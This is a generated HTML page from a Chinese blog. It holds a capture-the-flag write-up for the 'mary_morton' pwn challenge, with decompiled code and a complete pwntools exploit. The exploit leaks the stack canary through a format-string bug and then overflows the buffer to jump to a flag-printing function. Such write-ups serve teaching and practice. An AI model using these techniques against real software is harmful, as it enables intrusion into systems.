@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    
+    
+    <title>mary_morton题解 | NightRainy&#39;s Blog | Stay hungry,stay foolish</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="">
+    <link rel="shortcut icon" href="/img/favicon.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.1">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"nightRainy","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/favicon.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">nightRainy</h5>
+          <a href="mailto:jianaiyuheng@qq.com" title="jianaiyuheng@qq.com" class="mail">
+            
+              <span>j</span>
+            
+              <span>i</span>
+            
+              <span>a</span>
+            
+              <span>n</span>
+            
+              <span>a</span>
+            
+              <span>i</span>
+            
+              <span>y</span>
+            
+              <span>u</span>
+            
+              <span>h</span>
+            
+              <span>e</span>
+            
+              <span>n</span>
+            
+              <span>g</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/nightRainy" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/">
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives">
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="https://github.com/nightRainy" target="_blank">
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>mary_morton题解</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">mary_morton题解</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-04-16T12:35:50.000Z" itemprop="datePublished" class="page-time">
+  2019-04-16
+</time>
+
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left">
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-mary-morton题解" class="post-article article-type-post" itemprop="blogPost">
+      <div class="post-card">
+          <h1 class="post-card-title">mary_morton题解</h1>
+          <div class="post-meta">
+              <time class="post-time" title="2019-04-16 20:35:50" datetime="2019-04-16T12:35:50.000Z" itemprop="datePublished">2019-04-16</time>
+
+              
+
+
+              
+
+              
+
+
+              
+          </div>
+          <div class="post-content" id="post-content" itemprop="postContent">
+              
+              <blockquote>
+<p>立一个flag,每天一道pwn题</p>
+</blockquote>
+<h1 id="先看一下程序的保护"><a href="#先看一下程序的保护" class="headerlink" title="先看一下程序的保护:"></a>先看一下程序的保护:</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">   RELRO:    Partial RELRO</span><br><span class="line">   Stack:    Canary found</span><br><span class="line">   NX:       NX enabled</span><br><span class="line">   PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>可以看到程序开了堆栈不可执行并且有金丝雀的保护</p>
+<h1 id="看一下程序主体"><a href="#看一下程序主体" class="headerlink" title="看一下程序主体:"></a>看一下程序主体:</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // [rsp+24h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v4; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  clear();</span><br><span class="line">  puts(&quot;Welcome to the battle ! &quot;);</span><br><span class="line">  puts(&quot;[Great Fairy] level pwned &quot;);</span><br><span class="line">  puts(&quot;Select your weapon &quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();                                   // puts(&quot;1. Stack Bufferoverflow Bug &quot;);</span><br><span class="line">                                                //   puts(&quot;2. Format String Bug &quot;);</span><br><span class="line">                                                //   return puts(&quot;3. Exit the battle &quot;);</span><br><span class="line">      __isoc99_scanf(&quot;%d&quot;, &amp;v3);</span><br><span class="line">      if ( v3 != 2 )</span><br><span class="line">        break;</span><br><span class="line">      format_string();                          // unsigned __int64 format_string()</span><br><span class="line">                                                // &#123;</span><br><span class="line">                                                //   char buf; // [rsp+0h] [rbp-90h]</span><br><span class="line">                                                //   unsigned __int64 v2; // [rsp+88h] [rbp-8h]</span><br><span class="line">                                                // </span><br><span class="line">                                                //   v2 = __readfsqword(0x28u);</span><br><span class="line">                                                //   memset(&amp;buf, 0, 0x80uLL);</span><br><span class="line">                                                //   read(0, &amp;buf, 0x7FuLL);</span><br><span class="line">                                                //   printf(&amp;buf, &amp;buf);</span><br><span class="line">                                                //   return __readfsqword(0x28u) ^ v2;</span><br><span class="line">                                                // &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 == 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(&quot;Bye &quot;);</span><br><span class="line">      exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v3 == 1 )</span><br><span class="line">      stack();                                  // unsigned __int64 stack()</span><br><span class="line">                                                // &#123;</span><br><span class="line">                                                //   char buf; // [rsp+0h] [rbp-90h]</span><br><span class="line">                                                //   unsigned __int64 v2; // [rsp+88h] [rbp-8h]</span><br><span class="line">                                                // </span><br><span class="line">                                                //   v2 = __readfsqword(0x28u);</span><br><span class="line">                                                //   memset(&amp;buf, 0, 0x80uLL);</span><br><span class="line">                                                //   read(0, &amp;buf, 0x100uLL);</span><br><span class="line">                                                //   printf(&quot;-&gt; %s\n&quot;, &amp;buf);</span><br><span class="line">                                                //   return __readfsqword(0x28u) ^ v2;</span><br><span class="line">                                                // &#125;</span><br><span class="line">    else</span><br><span class="line">      puts(&quot;Wrong!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>为了方便看程序,我对程序做了一些修改,可以看到选项一里有一个明显的栈溢出,但是因为加了canary,所以我们需要泄露出canary才能进行溢出,但是正好,第二个选项里有一个格式化字符串漏洞,因此我们采用格式化字符串漏洞来泄露canary,然后利用栈溢出漏洞即可.</p>
+<h1 id="exp如下"><a href="#exp如下" class="headerlink" title="exp如下:"></a>exp如下:</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh=process(&apos;./mary_morton&apos;)</span><br><span class="line"></span><br><span class="line">cat_flag=0x04008DE</span><br><span class="line">log.info(&quot;FSB&quot;)</span><br><span class="line">sh.sendlineafter(&apos;3. Exit the battle \n&apos;, &apos;2&apos;)</span><br><span class="line">sh.sendline(&apos;%23$p&apos;)</span><br><span class="line">pause(3)</span><br><span class="line">canary=sh.recv()</span><br><span class="line">canary = int(re.search(&apos;0x[0-9a-f]&#123;16&#125;&apos;, canary).group(), 16)</span><br><span class="line"></span><br><span class="line">log.info(&quot;canary ==&gt; &#123;0:x&#125;&quot;.format(canary))</span><br><span class="line"></span><br><span class="line">sh.sendline(&quot;1&quot;)</span><br><span class="line">payload=&quot;a&quot;*136</span><br><span class="line">payload+=p64(canary)</span><br><span class="line">payload+=&quot;a&quot;*8</span><br><span class="line">payload+=p64(cat_flag)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure>
+
+          </div>
+          
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-04-16T13:10:29.740Z" itemprop="dateUpdated">2019-04-16 21:10:29</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/04/16/mary-morton题解/" target="_blank" rel="external">https://nightRainy.github.io/2019/04/16/mary-morton题解/</a>
+        
+    </div>
+    <footer>
+        <a href="https://nightRainy.github.io">
+            <img src="/img/favicon.jpg" alt="nightRainy">
+            nightRainy
+        </a>
+    </footer>
+</blockquote>
+
+          
+          
+          <div class="post-footer">
+              
+              <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://nightRainy.github.io/2019/04/16/mary-morton题解/&title=《mary_morton题解》 — NightRainy's Blog&pic=https://nightRainy.github.io/img/favicon.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://nightRainy.github.io/2019/04/16/mary-morton题解/&title=《mary_morton题解》 — NightRainy's Blog&source=my blogs" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+          </div>
+          
+              
+
+
+          
+      </div>
+      
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2019/04/13/攻防世界-pwn-萌新入坑/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">攻防世界_pwn_萌新入坑</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+      
+      
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#先看一下程序的保护"><span class="post-toc-number">1.</span> <span class="post-toc-text">先看一下程序的保护:</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#看一下程序主体"><span class="post-toc-number">2.</span> <span class="post-toc-text">看一下程序主体:</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#exp如下"><span class="post-toc-number">3.</span> <span class="post-toc-text">exp如下:</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </div></div></aside>
+    
+  </article>
+  
+  
+</div>
+
+        <footer class="footer">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                nightRainy &copy; 2017 - 2019
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://nightRainy.github.io/2019/04/16/mary-morton题解/&title=《mary_morton题解》 — NightRainy's Blog&pic=https://nightRainy.github.io/img/favicon.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://nightRainy.github.io/2019/04/16/mary-morton题解/&title=《mary_morton题解》 — NightRainy's Blog&source=my blogs" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMElEQVR42u3aQY4CMQwFUe5/6eYALUJ9OyDFXVkhJjR+LDyxndcLr+u27n9d719/ar1z25IhQ8axjGu57ns6X/xp5/3JPDYZMmQ8h5E+mqTOdVYkCZ3EJkOGDBlkz/rr10GnP5kMGTJkpAmXHyg76VuGDBkyeBFLSlOSXmvF87ZaXIYMGQcy0jbZP1//ZL4hQ4aMoxhXuHhBu+sdFJUMGTJGM3iC47C09CWHSDRgkCFDxlAGCag2biQBkeRLWnIyZMiYzeCXIUgrjQRRe3L8M8mQIWMQgw8v+1fH+u28j5+SIUPGaEZaOvYLXZKa+Z7gf4UMGTIGMcgYYO+kNC1i0alWhgwZ4xgk3LTplpa16Vj0I0mGDBnjGOml0tpIYO+hE7XbZMiQMYhRO1+RFn+fylOwDBkyZjP4lYh+KuRDys1XK2TIkHE4o0aqXSPjpW+nMSdDhox5jLRYrQVXGxIE+2XIkDGaQYLj7fs1KT0U8gsZMmTIeAIjHQB0ytTafpTKZciQ8QBGekTjc4b00mp64UOGDBnPYfBk10nTvJXGX8uQIeM5jNo7/7869mWyIUOGjHGMK1y8NOVHOl4qf+kRypAhYygjHRaSNFoLt3ZMjGEyZMg4lpEe7NIiNk2jtSGoDBkynsDYe/Gif3yMxwwyZMiQsTX5ktDjM6wMGTJkgOTbuXiRjlE3J1wZMmQcwuDDAN5W65esP2m3yZAh40BG7dxFHsTDIul+w1BThgwZ5zHel72TYUWAvWAAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.1"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.1"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.1"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.1"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.1"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '/(ㄒoㄒ)/~~嘤嘤嘤，不要我了';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)来啦官人';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+</body>
+</html>
